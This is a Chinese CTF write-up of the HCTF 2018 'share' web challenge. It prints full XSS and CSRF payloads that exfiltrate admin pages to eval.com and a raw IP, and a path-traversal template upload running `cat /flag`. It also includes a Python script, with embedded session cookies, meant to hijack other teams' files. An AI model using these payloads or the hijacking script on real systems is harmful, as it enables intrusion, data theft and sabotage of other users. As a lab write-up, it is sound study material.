---
title: 2019HCTF-share
comments: true
date: 2018-11-13 07:53:00 
tags:
	- writeup
    - web
    - xss
categories:
	- 信息安全
	- writeup
keywords:
    - hctf
    - writeup
    - xss

---

> 本文首发先知社区，文章链接：https://xz.aliyun.com/t/3258

这次比赛感觉比较有意思的一道题。2019 HCTF-share

<!-- more -->

> **描述**
>
> I have built an app sharing platform, welcome to share your favorite apps for everyone
>
> hint1:https://paste.ubuntu.com/p/VfJDq7Vtqf/ 
>
> Alpha_test code:https://paste.ubuntu.com/p/qYxWmZRndR/
>
> hint2:
>
> ```erb
> <%= render template: "home/"+params[:page] %>
> ```
>
> in root_path
>
> hint3: based ruby 2.5.0
>
> **URL**
>
> [http://share.2018.hctf.io](http://share.2018.hctf.io/)
>
> **基准分数**  1000.00
>
> **当前分数**  965.54
>
> **完成队伍数**  1

-----

开始做这道题，本来是因为疑似XSS，勾起了自己的兴趣。没想到越往后越坑。ruby真心没见过。最终耗时27小时，终于搞出来了，话说一血还是很开心的。

## 解题

首先分析一波整到题目，按照题目描述，这个网站是用来共享应用的。

首先用户可以向管理员反馈建议，让管理员将某应用加到网站上。

![20181111154191320686524.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141244-f830b9b0-e641-1.png)

然后管理员页面会有上传应用到网站上，以及将某应用下发给某人进行测试。

主要页面如下：

> 用户：
>
> 应用展示页：http://share.2018.hctf.io/home/publiclist
>
> 测试应用页：http://share.2018.hctf.io/home/Alphatest（管理员未下发应用时为空）
>
> 反馈建议页：http://share.2018.hctf.io/home/share

通过用户反馈页面，可以尝试插入xss。在这里用img进行测试:

```html
<img src=//eval.com:2222>
```

然后在eval.com进行监听。

```bash
nc -lnvp 2222
```

![20181111154191380138997.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141245-f870d6e4-e641-1.png)

成功收到回显，可以得知采用PhantomJS作为bot，然后尝试读取后台源码。

```js
function send(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "//eval.com:2017", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.send(e);
}
function getsource(src){
	var t = new XMLHttpRequest;
    t.open("GET", src, !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.onload=function(e){
    	send(e.target.responseText);
    }
    t.send();
}
getsource("/home/publiclist");
```

通过后台源码可以发现管理员页面。

> 管理员：
>
> 上传应用页：http://share.2018.hctf.io/home/upload
>
> 下发应用页：http://share.2018.hctf.io/home/addtest

至此，可以猜测完整利用链为如下：

> CSRF上传shell --> CSRF将文件下发到用户端 --> 用户端获得shell链接 --> GET Shell

一开始，按正常逻辑，写出upload的exp， 经本地测试完全可用。然而打过去之后，发现一直报错500。尝试下发的时候，也是500。

真心难受，最后实在受不了问出题人，他说他的payload没问题，可以用的。

最后，在自己和题目的磨磨唧唧中，队友发来了robots.txt里有代码。然后…心态有点炸。就顾xss了，竟然忘了渗透的基本要素，逮到网站先扫扫。

拿到upload的源码如下。

```ruby
# post /file/upload
  def upload
    if(params[:file][:myfile] != nil && params[:file][:myfile] != "")
      file = params[:file][:myfile]
      name = Base64.decode64(file.original_filename)
      ext = name.split('.')[-1]
      if ext == name || ext ==nil
        ext=""
      end
      share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public/upload")
      share.write(Base64.decode64(file.read))
      share.close
      File.rename(share.path,share.path+"."+ext)
      tmp = Sharefile.new
      tmp.public = 0
      tmp.path = share.path
      tmp.name = name
      tmp.tempname= share.path.split('/')[-1]+"."+ext
      tmp.context = params[:file][:context]
      tmp.save
    end
    redirect_to root_path
  end
```

可以发现此处上传的文件名和文件内容，都会经过base64解码，所以此时需要修改一下。

最终exp如下：

```js
function send(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "//eval.com:2017", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.send(e);
}
function submitRequest(authenticity_token)
{
    authenticity_token = authenticity_token.replace(/\+/g, "%2b");
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/file/upload", true);
    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
    xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP");
    xhr.withCredentials = "true";
    var body = "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
      "Content-Disposition: form-data; name=\"utf8\"\r\n" +
      "\r\n" +
      "%E2%9C%93\r\n"+
      "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
      "Content-Disposition: form-data; name=\"authenticity_token\"\r\n" +
      "\r\n" +
      authenticity_token + "\r\n" +
      "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
      "Content-Disposition: form-data; name=\"file[context]\"\r\n" +
      "\r\n" +
      "1\"\r\n" +
      "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
      "Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"PD9waHAgcGhwaW5mbygpOyA/Pg==\"\r\n" +
      "Content-Type: application/octet-stream\r\n" +
      "\r\n" +
      "PCU9YGNhdCAvZmxhZ2AlPg==\r\n" +
      "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP--\r\n"+

      "Content-Disposition: form-data; name=\"commit\"\r\n" +
      "\r\n" +
      "submit\r\n" +
      "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n";
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++)
      aBody[i] = body.charCodeAt(i);
    xhr.onload=function(evt){
      var data = evt.target.responseText;
      send(data);
    }
    xhr.send(new Blob([aBody]));
}
function gettoken(){
    var t = new XMLHttpRequest;
    t.open("GET", "/home/upload", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.onload=function(evt){
      var data = evt.target.responseText;
      regex = /<input type="hidden" name="authenticity_token" value="(.+)?"/g;
      submitRequest(regex.exec(data)[1]);
    }
    t.send();
}
gettoken();
```

此时可以成功上传文件，可以在Alphatest页面，查看到当前总文件数。

然后通过CSRF构造下发。

```js
function send(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "//eval.com:2017", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.send(e);
}
function submitRequest(authenticity_token)
{
    authenticity_token = authenticity_token.replace(/\+/g, "%2b");
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/file/Alpha_test", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.setRequestHeader("Referer", "http://share.2018.hctf.io/home/addtest");
    xhr.setRequestHeader("Origin", "http://share.2018.hctf.io");
    xhr.onload=function(evt){
      var data = evt.target.responseText;
      send(data);
    } 
    xhr.send("utf8=%E2%9C%93&authenticity_token="+authenticity_token+"&uid=30&fid=42&commit=submit");
}
function gettoken(){
    var t = new XMLHttpRequest;
    t.open("GET", "/home/addtest", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.onload=function(evt){
      var data = evt.target.responseText;
      regex = /<input type="hidden" name="authenticity_token" value="(.+)?"/g;
      submitRequest(regex.exec(data)[1]);
    }
    t.send();
}
gettoken();
```

依旧一直报500，当时很懵，然后电脑刚好没电，没有继续试下去。也没好意思再问主办方，毕竟之前是自己没看源码。

第二天一早醒来...

![2018111115419149992367.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141245-f8aa8e84-e641-1.png)

吃瓜的我，感觉到一股深深的恶意....

![20181111154191501722090.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20181112141246-f953f91a-e641-1.jpg)



接着再试就可以了。此时成功拿到自己上传的文件。然而…有个卵用。

![20181111154191740758587.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141247-f99f70b6-e641-1.png)

![20181111154191742679515.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141247-f9be7222-e641-1.png)

ruby的环境，出题人肯定没有配置PHP解析。然后…该如何是好。恰好中午主办方放出了hint

```erb
<%= render template: "home/"+params[:page] %>
```

可以很明了的看出来，需要通过上传模板，然后进行包含。但是查询资料发现如下。

![20181111154191810268449.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20181112141247-f9ff76fa-e641-1.jpg)

也就是说，上传文件，必须上传到/app/views/home目录下。此时才可以进行包含。

话说之前一直傻在这里了，否则早就出了。先说下正确做法吧。

```
文件名：../../app/views/home/test.erb

文件内容：<%=`cat /flag`%>
```

编码后上传即可。此时便实现了跨目录上传。然后获取到文件名后，通过

```url
http://share.2018.hctf.io/home?page=te20181110-328-zexae3
```

即可成功包含，获取flag。



## 搅屎

做完题目后，在和出题人沟通时，意外得知了一个好玩的。

![20181111154192078348689.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141248-fa3a2750-e641-1.png)

fid只可以给一次，那么，我可以通过监听，来做到，只要出现新文件，立马给到我的账号。这样别人永远无法获得上传文件。想法很棒，但是现实却很真实，自己第二天写wp才想到要搅屎，此时复现时发现有一个队在做。加紧写出了搅屎代码。然而没卵用，刚写好，跑起来。看见那边二血已经到手。

但最后还是再服务器跑着，以防三血诞生。但是，好像并没有人继续做下去了。

```python
import requests
import re
import time

payload="""
<script>function send(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "//139.199.107.193:2017", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.send(e);
}
function submitRequest(authenticity_token)
{
    authenticity_token = authenticity_token.replace(/\+/g, "%2b");
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/file/Alpha_test", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.setRequestHeader("Referer", "http://share.2018.hctf.io/home/addtest");
    xhr.setRequestHeader("Origin", "http://share.2018.hctf.io");
    xhr.onload=function(evt){
      var data = evt.target.responseText;
      send(data);
    } 
    xhr.send("utf8=%E2%9C%93&authenticity_token="+authenticity_token+"&uid={{uid}}}&fid={{fid}}&commit=submit");
}
function gettoken(){
    var t = new XMLHttpRequest;
    t.open("GET", "/home/addtest", !0),
    t.setRequestHeader("Content-type", "text/plain"),
    t.onreadystatechange = function() {
        4 == t.readyState && t.status
    },
    t.onload=function(evt){
      var data = evt.target.responseText;
      regex = /<input type="hidden" name="authenticity_token" value="(.+)?"/g;
      submitRequest(regex.exec(data)[1]);
    }
    t.send();
}
gettoken();</script>

"""
headers={
	"Cookie": "_ga=GA1.2.1234049971.1541560268; _gid=GA1.2.395925356.1541764703; _hctf_session=IDl7oRVicLrzfQVGJ32JMMAL%2FkFQRZIqFGC4Az6xEzV2PW%2FG5JHNkaPTCL8McBALbeLexyWC9ltWt%2FU0XAbxnEihvGIQnvvZagnW%2F1I37tAXwbmKG9XUlOp2tkeXTNfVYIIhhzQGiFbfUFFhf2n%2BGRrcw9eu7Tnyn89bsI4fZCvSYgRrZCJJaZGJ%2BaDH8sFoaB1n1spPkQ7%2BHZoCdFdGN9PLPKWv9It3G5UL--FtVXtYfT0mQLejyc--cPeuwvnr0YSug5Ie0XwZCA%3D%3D"
}
def sendshi(uid,fid):

	headers={
		"Cookie": "_ga=GA1.2.1234049971.1541560268; _gid=GA1.2.395925356.1541764703; _hctf_session=Zt95n%2BqsePGzFV500lXzBLPBbtLVXQNhqypxEw%2Bw%2BrP9Pko9k%2B9jcXuB15FZ27ahSD18NhwxMn2dU7vT9U4GUy%2FIK1Ph2XxeYXNImY36jCqhjYfAlmzIy7hmBkU4MUxC9Y54%2FYCY9s6NOYACi1ZOeXBUmIlw8f1d6TyKQBmn4pRbQkiSRWRRFezqPS8iKpZ%2Bl4B7ZLnwZPky7NC%2BvUTGk5YjTpMZIAdITA88--WH67dwY%2FiXpMn013--hYBC7B4fWamLvU9%2BxFJCAw%3D%3D"
		}
	
	url="http://share.2018.hctf.io/recommend/to_admin"
	
	data={
	"utf8":"%E2%9C%93",
	"authenticity_token":"sK5IwUnkg2m2dVlQHb3DH4/XRQnHlz2BFWz7fEFSYSFhRjtL3cqWBJLd8+qrKwRzSe+4+nQ/lt8NlACosshm9g==",
	"context":payload.replace("{{uid}}",uid).replace("{{fid}}",fid),
	"url":"",
	"commit":"submit"
	}
	r = requests.post(url,data=data,headers=headers,timeout=3)
	print r.status_code

url="http://share.2018.hctf.io/home/Alphatest"
fid=0
uid=0

while(1):
	try:
		r=requests.get(url,headers=headers,timeout=3)
		pattern = re.compile(r'file number:(\d+) your uid: (\d+)')
		result1 = pattern.findall(r.text)
		if(fid != result1[0][0]):
			fid=result1[0][0]
			uid=result1[0][1]
		else:
			time.sleep(1)
			print(result1)
			contine
		sendshi(result1[0][1],result1[0][0])
		time.sleep(1)
	except:
		time.sleep(1)
```



## 两个不明白的地方

### Tempfile跨目录 (SOLVED)

自己之前一直在纠结可能有其他点，因为之前自己测试的时候，通过../会导致500错误。可能也是因为那一夜，自己有点懵。被500吓怕了。所以往后一直在通过自己本地ruby来测试如何绕过。

测试期间发现。

```ruby
 share = Tempfile.new(name,path)
```

其中path中，可以用../跨目录，但是name中的斜杠，会被自动删掉，很迷。

![20181111154191881741482.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141248-fa61fec4-e641-1.png)

然而题目中的可控点又是在name中。

```ruby
name = Base64.decode64(file.original_filename)
ext = name.split('.')[-1] 
share = Tempfile.new(
     name.split('.'+ext)[0],
     Rails.root.to_s+"/public/upload"
 )
```

所以导致自己把思路放在了这边，没有再次远程尝试。

甚至还动摇了，怀疑page的点没有找到。

最后才发现自己环境不对，两次测试环境，一次是2.3.7，另一次是2.5.3.....

一开始考虑到可能是这个CVE-2018-6914，但是他描述中写的是目录，也就想当然是我以上那个path。

![20181111154192175630383.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141248-faaf1858-e641-1.png)





**最后用2.5.0终于复现成功**

一键ruby环境....

```bash
sudo docker run -dit --rm ruby:2.5.0
```

![20181111154192141712914.png](https://xzfile.aliyuncs.com/media/upload/picture/20181112141249-faf28f84-e641-1.png)



### render template之谜 (SOLVED)

```erb
<%= render template: "home/"+params[:page] %>
```

如果正常理解以上代码，就是限制包含home控制器下的文件。

但是事实上按照出题给的hint1

![20181113154209251493982.png](https://xzfile.aliyuncs.com/media/upload/picture/20181113150306-2c171668-e712-1.png)

如下两个链接包含后都很迷。

```
http://share.2018.hctf.io/home?page=index
http://share.2018.hctf.io/home?page=../layouts/mailer
```

首先是第一个index.html.erb，可以假设理解为他的代码存在问题，导致500。（包含失败也是500）

接下来的第二个就更迷了，既然限制了home，为什么还能跳去layouts。当时有点纠结这个问题，导致思维有点乱，心态也有所干扰。

**赛后自己尝试了一下。发现只要是views内的内容都可以进行包含。也就是说那个控制器限定没个卵用，但是必须在视图文件夹内。**

那么，可以总结一下。

```ruby
# 可以渲染任意路径文件
render "path"
render file: "path" 
# 仅能渲染当前项目下 app/views内的任何内容
render template: "products/show"
```




## 参考资料

- [Rails 布局和视图渲染](https://ruby-china.github.io/rails-guides/layouts_and_rendering.html)
- [利用csrf漏洞上传文件](https://www.freebuf.com/articles/web/17854.html)
- [ezXSS](https://github.com/ssl/ezXSS)
- [Tempfile](https://ruby-doc.org/stdlib-2.5.0/libdoc/tempfile/rdoc/Tempfile.html)
- [Rails Dynamic Render 远程命令执行漏洞 (CVE-2016-0752)](https://www.seebug.org/vuldb/ssvid-90633)
- [CVE-2018-6914: tempfile 和 tmpdir 库中意外创建文件和目录的缺陷](https://www.ruby-lang.org/zh_cn/news/2018/03/28/unintentional-file-and-directory-creation-with-directory-traversal-cve-2018-6914/)